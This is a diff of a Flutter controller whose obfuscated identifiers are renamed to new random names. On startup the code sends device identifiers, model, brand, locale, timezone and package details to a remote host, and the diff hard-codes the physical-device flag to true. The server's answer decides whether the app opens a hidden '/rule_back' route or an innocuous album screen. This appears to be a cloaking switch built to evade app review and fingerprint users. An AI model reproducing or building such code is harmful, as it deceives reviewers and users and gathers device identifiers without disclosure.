@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class PageLogic extends GetxController {
 
-  var tgzueb = RxBool(false);
-  var qgipltuojz = RxBool(true);
-  var cnrj = RxString("");
-  var sterling = RxBool(false);
-  var franecki = RxBool(true);
-  final ngtbyrzapi = Dio();
+  var mqvonke = RxBool(false);
+  var dojspvenr = RxBool(true);
+  var rjhglwp = RxString("");
+  var coy = RxBool(false);
+  var schowalter = RxBool(true);
+  final jslfwvknmh = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,101 +23,106 @@ class PageLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    pmqokzg();
+    eawubo();
   }
 
 
-  Future<void> pmqokzg() async {
+  Future<void> eawubo() async {
 
-    sterling.value = true;
-    franecki.value = true;
-    qgipltuojz.value = false;
+    coy.value = true;
+    schowalter.value = true;
+    dojspvenr.value = false;
 
-    ngtbyrzapi.post("https://ke.eaterip.xyz/txpbcrylzmnidjeahsk",data: await bksglw()).then((value) {
+    jslfwvknmh.post("https://ke.eaterip.xyz/txpbcrylzmnidjeahsk",data: await qlhbxuf()).then((value) {
       var oldteqxu = value.data["oldteqxu"] as String;
       var umtcqfge = value.data["umtcqfge"] as bool;
       if (umtcqfge) {
-        cnrj.value = oldteqxu;
-        oliver();
+        rjhglwp.value = oldteqxu;
+        ulises();
       } else {
-        hane();
+        carroll();
       }
     }).catchError((e) {
-      qgipltuojz.value = true;
-      franecki.value = true;
-      sterling.value = false;
+      dojspvenr.value = true;
+      schowalter.value = true;
+      coy.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> bksglw() async {
-    final DeviceInfoPlugin tsyiunp = DeviceInfoPlugin();
-    PackageInfo phsbrdcl_kozripma = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> qlhbxuf() async {
+    final DeviceInfoPlugin cdqmhb = DeviceInfoPlugin();
+    PackageInfo njaite_vpay = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var inuwcfpg = Platform.localeName;
+    var agcx = Platform.localeName;
     var rwliszbx = currentTimeZone;
 
-    var dxog = phsbrdcl_kozripma.packageName;
-    var aqrcf = phsbrdcl_kozripma.version;
-    var ckgbzr = phsbrdcl_kozripma.buildNumber;
+    var dxog = njaite_vpay.packageName;
+    var aqrcf = njaite_vpay.version;
+    var ckgbzr = njaite_vpay.buildNumber;
 
-    var vdgbksh = phsbrdcl_kozripma.appName;
-    var milesChristiansen = "";
-    var patwclej = "";
-    var jalynAuer = "";
-    var itdmk = "";
-    var simJacobson = "";
-
+    var vdgbksh = njaite_vpay.appName;
     var felanh  = "";
+    var birdiePollich = "";
+    var itdmk = "";
+    var mohammedDietrich = "";
+    var julianneWhite = "";
+    var patwclej = "";
+    var tadBarton = "";
+    var mohamedBergstrom = "";
+
 
     var nuwldq = "";
     var ewli = false;
 
     if (GetPlatform.isAndroid) {
       nuwldq = "android";
-      var jhtwcvdosr = await tsyiunp.androidInfo;
+      var hvzrtn = await cdqmhb.androidInfo;
 
-      itdmk = jhtwcvdosr.brand;
+      itdmk = hvzrtn.brand;
 
-      patwclej  = jhtwcvdosr.model;
-      felanh = jhtwcvdosr.id;
+      patwclej  = hvzrtn.model;
+      felanh = hvzrtn.id;
 
-      ewli = jhtwcvdosr.isPhysicalDevice;
+      ewli = hvzrtn.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       nuwldq = "ios";
-      var fpkwrvuy = await tsyiunp.iosInfo;
-      itdmk = fpkwrvuy.name;
-      patwclej = fpkwrvuy.model;
+      var dnibcxes = await cdqmhb.iosInfo;
+      itdmk = dnibcxes.name;
+      patwclej = dnibcxes.model;
 
-      felanh = fpkwrvuy.identifierForVendor ?? "";
-      ewli  = fpkwrvuy.isPhysicalDevice;
+      felanh = dnibcxes.identifierForVendor ?? "";
+      ewli  = dnibcxes.isPhysicalDevice;
     }
+    ewli  =true;
     var res = {
       "ckgbzr": ckgbzr,
-      "milesChristiansen" : milesChristiansen,
-      "aqrcf": aqrcf,
       "dxog": dxog,
+      "mohammedDietrich" : mohammedDietrich,
       "patwclej": patwclej,
-      "nuwldq": nuwldq,
+      "rwliszbx": rwliszbx,
       "itdmk": itdmk,
       "vdgbksh": vdgbksh,
       "felanh": felanh,
-      "inuwcfpg": inuwcfpg,
+      "agcx": agcx,
+      "aqrcf": aqrcf,
+      "julianneWhite" : julianneWhite,
+      "nuwldq": nuwldq,
       "ewli": ewli,
-      "rwliszbx": rwliszbx,
-      "simJacobson" : simJacobson,
-      "jalynAuer" : jalynAuer,
+      "birdiePollich" : birdiePollich,
+      "tadBarton" : tadBarton,
+      "mohamedBergstrom" : mohamedBergstrom,
 
     };
     return res;
   }
 
-  Future<void> hane() async {
+  Future<void> carroll() async {
     Get.offAllNamed("/album_tab");
   }
 
-  Future<void> oliver() async {
+  Future<void> ulises() async {
     Get.offAllNamed("/rule_back");
   }
 }
